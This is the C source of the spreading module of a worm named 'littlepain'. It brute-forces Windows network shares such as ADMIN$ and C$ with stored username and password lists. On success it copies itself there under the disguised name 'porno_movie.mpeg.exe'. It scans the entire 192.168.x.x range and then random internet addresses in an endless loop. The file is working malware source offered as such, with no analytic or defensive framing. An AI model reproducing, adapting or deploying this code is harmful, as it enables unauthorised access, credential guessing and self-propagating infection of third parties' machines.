#include "littlepain.h"

/* This function will copy the worm in shares */
void NetSpread(char *remote,char *my_path)
{
	NETRESOURCE net_inf;
	char nb_remote[MAX_PATH],*share_name[] = {"SharedDocs","ADMIN$","C$","D$","E$","C","D"};
	DWORD ret,share_cnt,users_cnt,pwd_cnt;

	for(share_cnt = 0;share_cnt < 7;share_cnt++) 
	{
		for(users_cnt = 0;users_cnt < USERS_NUM;users_cnt++)
		{
 			for(pwd_cnt = 0;pwd_cnt < PWD_NUM;pwd_cnt++)
			{
				memset(nb_remote,0,MAX_PATH);
				sprintf(nb_remote,"%s\\%s",remote,share_name[share_cnt]);
				memset(&net_inf,0,sizeof(net_inf));
				net_inf.dwDisplayType = RESOURCETYPE_ANY;
				net_inf.lpRemoteName = nb_remote;
				net_inf.lpLocalName = NULL;
				net_inf.lpProvider = NULL;

				/* try to connect */
				ret = WNetAddConnection2(&net_inf,
					passwords_list[pwd_cnt],
					users_list[users_cnt],
					0);

				if(ret == NO_ERROR)
				{
					/* OK! */
					strcat(nb_remote,"\\porno_movie.mpeg.exe");
					CopyFile(my_path,nb_remote,FALSE);
					memset(nb_remote,0,MAX_PATH);
					sprintf(nb_remote,"%s\\%s",remote,share_name[share_cnt]);
					WNetCancelConnection(nb_remote,TRUE);
				}
			}
		}
	}
		
}

 /* LAN spreading */
DWORD WINAPI L0cal(LPVOID Data)
{
	char local[64];
	DWORD cnt1,cnt2;
	
	for(cnt1 = 0;cnt1 <= 255;cnt1++)
	{
		for(cnt2 = 0;cnt2 <= 255;cnt2++)
		{
			memset(local,0,64);
			sprintf(local,"\\\\192.168.%d.%d",cnt1,cnt2);
			NetSpread(local,(char *)Data);
		}
	}
}

 /* internet spreading ( I hope :) ) */
DWORD WINAPI extra(LPVOID Data)
{
	char internet[64];

	while(1)
	{
		srand(GetTickCount());
		
		/* generate random ip */
		memset(internet,0,64);
		sprintf(internet,"\\\\%d.%d.%d.%d",rand()%256,
			rand()%256,rand()%256,rand()%256);

		NetSpread(internet,(char *)Data);
	}
}